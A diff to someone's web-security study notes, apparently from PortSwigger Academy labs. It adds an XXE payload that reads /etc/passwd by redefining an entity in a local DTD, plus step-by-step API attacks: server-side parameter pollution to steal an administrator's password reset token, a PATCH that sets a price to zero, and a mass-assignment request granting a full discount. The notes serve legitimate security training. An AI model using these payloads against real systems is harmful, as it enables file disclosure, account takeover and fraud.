@@ -69,6 +69,10 @@
 - Turbo Intruder: sending large numbers of HTTP requests and analyzing the results [Brute-force]
 - Logger++: allows the logs to be searched to locate entries which match a specified pattern [Information disclosure]
 - Collaborator Everywhere: Find SSRF issues; injecting non-invasive headers designed to reveal backend systems by causing pingbacks to Burp Collaborator [Blind SSRF]
+- OpenAPI Parser: Target > Site map > Send to OpenAPI Parser [API testing]
+- JS Link Finder: Scanning js files for endpoint links [API testing]
+- Content Type Converter: JSON to XML; XMl to JSON; Body param to JSON; Body param to XML [API testing]
+- Param Miner: identifies hidden, unlinked parameters.  useful for finding web cache poisoning vulnerabilities [API testing]
   
 ## SQL Injection
 **How to detect**     
@@ -1459,12 +1463,135 @@ Interfere with an application's processing of XML to view files on the applicati
   - Click "View exploit" > note the exploit URL
   - Check Stock repeater modify the body param   
     `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
-- ddd
+- Exploiting XXE to retrieve data by **repurposing a local DTD (Expert)**
+  - reference an existing DTD file on the server and redefine an entity from it
+  - /usr/share/yelp/dtd/docbookx.dtd ； entity: ISOamso
+  - Check Stock repeater modify the body param
+  - Redefine the ISOamso entity, triggering an error message 
+    ```
+    <!DOCTYPE message [
+      <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+      <!ENTITY % ISOamso '
+      <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+      <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+      &#x25;eval;
+      &#x25;error;
+      '>
+      %local_dtd;
+      ]>
+    ```    
 
 ## API
-Content for API...
+**Discovering API documentation**
+- /api
+- /swagger/index.html
+- /openapi.json
+- /api/swagger/v1
+- /api/swagger
+- /api
+- using intruder to uncover [hidden endpoints](https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d)
 
+**Identifying supported HTTP methods**   
+```
+GET
+POST
+PUT
+DELETE
+PATCH
+OPTIONS
+HEAD
+TRACE
+CONNECT
+```
+**Finding hidden parameters**
+- Param Miner: identifies hidden, unlinked parameters.  useful for finding web cache poisoning vulnerabilities
+- Content diiscovery
+- Mass assignment vulnerabilities
+
+**Mitigation**
+- Secure your documentation, kept up to date
+- allowlist of permitted HTTP method   
+- Use Strong Authentication such as OAuth, JWT, or API keys to ensure only authorized users can access the API. RBAC; Token Expiry and Rotation.
+- Rate Limiting and Throttling
+- Graceful Error Handling and Logging
+  
 ### API Lab
+- Exploiting an API endpoint using **documentation**
+  https://0a4b00aa036437a4808817f400bc0053.web-security-academy.net/`api`/
+- Exploiting **server-side parameter pollution** in a query string
+  - Test username
+    **POST /forgot-password** 
+    username=administrator > results   
+    username=invalid > Invalid username   
+  - Finding second param &x=y
+    username=administrator**%26x=y** > Error: Parameter is not supported   
+  - truncate the server-side query string using a URL-encoded #
+    username=administrator**%23** > Error: Field not specified   
+  - **Brute-force** the value of the **field parameter**
+    POST /forgot-password
+    username=administrator%26field=**§x§**%23
+    Payloads add from list > Server-side variable names
+    200 status: email, username   
+  - Engagement tools > Find scripts > review the /static/js/forgotPassword.js
+    **/forgot-password?reset_token**=${resetToken}   
+  - change the value of the **field parameter** from email to **reset_token**
+    POST /forgot-password
+    username=administrator`%26field=reset_token%23`
+    resend > retrieve token value   
+  - **GET /forgot-password** append the reset_token
+    GET /forgot-password?reset_token=[YOUR TOKEN]
+  - Reach change password page   
+- Finding and **exploiting an unused API** endpoint
+  - Discover endpoints
+    GET /api/products/1/price
+  - Identify supported http methods > GET, PATCH
+  - Extensions > Change **Content Type Converter** > Convert to JSON
+  - Update price
+    ```
+    PATCH /api/products/1/price
+    {"price":0}
+    ```
+- Exploiting a **mass assignment** vulnerability
+  - **Disover API endpoints**
+    - POST /api/checkout
+    - POST /api/doc/Order
+    - GET /api/doc/ChosenProduct
+  - **Change request method to GET** /api/checkout > send > discover "chosen_discount"
+    ```
+    {"chosen_discount":{"percentage":0},"chosen_products":[]}
+    ```
+- in POST /api/checkout, append the "chosen_discount" properties and set percentage to 100
+  ```
+  {
+    "chosen_discount":{
+        "percentage":100
+    },
+    "chosen_products":[
+        {
+            "product_id":"1",
+            "quantity":1
+        }
+     ]
+   }
+  ```
+- Exploiting **server-side parameter pollution** in a REST URL
+  - **Discover urls** > review /static/js/forgotPassword.js   
+    /forgot-password?**passwordResetToken**=${resetToken}
+  - Test the new url   
+    https://0a4d00e204437cd0804f0d9c00b7004e.web-security-academy.net/forgot-password?**passwordResetToken=123** > invalid token   
+  - Trial and Error **API routes**   
+    POST /forgot-password   
+    username=administrator`/../../../../../openapi.json%23`   
+    Result: Error: **/api/internal/v1/users/{username}/field/{field}**   
+  - Test for **field name**   
+    username=administrator/field/passwordResetToken#   
+    Result: Error: **This version of API only** supports the email field for security reasons   
+  - Try **other version API**   
+    POST /forgot-password   
+    username=`../../v1/users/administrator/field/passwordResetToken#`   
+    Result: 54iz54pjco7znfuihs9d9y4q13nilbm4   
+  - Access forgot password page of Admin   
+    https://0a4d00e204437cd0804f0d9c00b7004e.web-security-academy.net/forgot-password?passwordResetToken=[YOUR TOKEN]
 
 ## CSRF (Cross-Site Request Forgery)
 Details about CSRF...
